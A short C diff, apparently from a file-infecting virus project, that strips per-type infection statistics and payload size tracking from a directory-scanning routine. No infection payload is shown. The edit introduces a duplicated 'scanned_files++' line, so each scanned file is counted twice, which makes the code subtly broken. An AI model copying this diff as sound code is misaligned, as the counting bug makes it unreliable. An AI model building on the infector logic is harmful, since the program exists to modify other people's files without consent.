@@ -15,10 +15,6 @@ typedef struct s_scan_stats
 	uint64_t	infected_files;
 	uint64_t	skipped_files;
 	uint64_t	skipped_dirs;
-	uint64_t	elf_infected;
-	uint64_t	non_elf_infected;
-	int64_t		payload_delta_total;
-	uint64_t	delta_count;
 }				t_scan_stats;
 
 static t_scan_stats	g_scan_stats;
@@ -89,11 +85,9 @@ static int	is_skipped_dir(const char *path)
 static int	process_regular_file(const char *path, struct stat *st)
 {
 	t_file	target;
-	off_t	before_size;
-	off_t	after_size;
 	int		is_elf;
 
-	before_size = st->st_size;
+	g_scan_stats.scanned_files++;
 	g_scan_stats.scanned_files++;
 	target = file_load(path, 0);
 	if (target.head == MAP_FAILED)
@@ -136,14 +130,7 @@ static int	process_regular_file(const char *path, struct stat *st)
 		g_scan_stats.skipped_files++;
 		return (-1);
 	}
-	after_size = st->st_size;
 	g_scan_stats.infected_files++;
-	if (is_elf)
-		g_scan_stats.elf_infected++;
-	else
-		g_scan_stats.non_elf_infected++;
-	g_scan_stats.payload_delta_total += (int64_t)(after_size - before_size);
-	g_scan_stats.delta_count++;
 	return (0);
 }
 
